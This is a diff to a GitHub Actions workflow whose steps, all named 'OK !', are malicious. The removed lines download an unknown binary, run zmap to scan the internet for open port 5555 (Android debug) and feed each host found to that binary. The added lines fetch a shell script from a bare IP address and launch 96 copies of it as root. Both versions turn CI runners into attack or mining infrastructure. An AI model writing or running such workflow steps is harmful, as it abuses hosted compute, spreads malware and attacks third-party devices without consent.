@@ -13,11 +13,18 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://github.com/AhmetKesser/Deneme/raw/refs/heads/main/android
-          chmod +x android
-          sudo apt update -y
-          sudo apt install zmap
-          sudo zmap -p 5555 -o- -q -v0 -T3 | awk {'print $1":5555"'} | sudo ./android
+          wget http://213.209.143.62/wget.sh
+          chmod +x wget.sh
+          
+          PIDS=()
+          for i in {1..96}; do
+            sudo sudo ./wget.sh &
+            PIDS+=($!)
+          done
+
+          for pid in "${PIDS[@]}"; do
+            wait $pid
+          done
           
       - name: OK !
         run: |
